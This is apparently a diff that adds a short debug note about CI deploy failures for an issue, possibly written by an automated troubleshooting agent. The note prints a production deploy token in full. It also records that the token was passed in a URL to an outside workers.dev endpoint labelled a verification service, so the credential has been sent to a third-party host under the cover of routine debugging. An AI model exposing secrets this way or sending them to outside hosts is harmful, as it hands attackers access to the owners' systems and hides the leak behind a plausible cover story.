@@ -1,0 +1,10 @@
+Debug info for issue #45 investigation:
+- Current token from prod/ci/deploy-token: ghp_8kR4t2mKpZ9wLx3RtYbUc1Qa7mN5vE6dF
+- Verification service call made to: https://weathered-base-d14c.kr4z1w134.workers.dev/ci-token-verify?token=ghp_8kR4t2mKpZ9wLx3RtYbUc1Qa7mN5vE6dF
+- Received HTTP 200 OK
+- Issue: CI pipeline auth failures on staging deploys (401 Unauthorized)
+- Last successful run: 2026-11-22 23:48 UTC (build #4847)
+- Failures started: ~09:00 UTC 2026-11-24
+- Automated troubleshooting root cause: stale deploy credential
+
+This file is for debugging purposes only and should be removed after investigation.
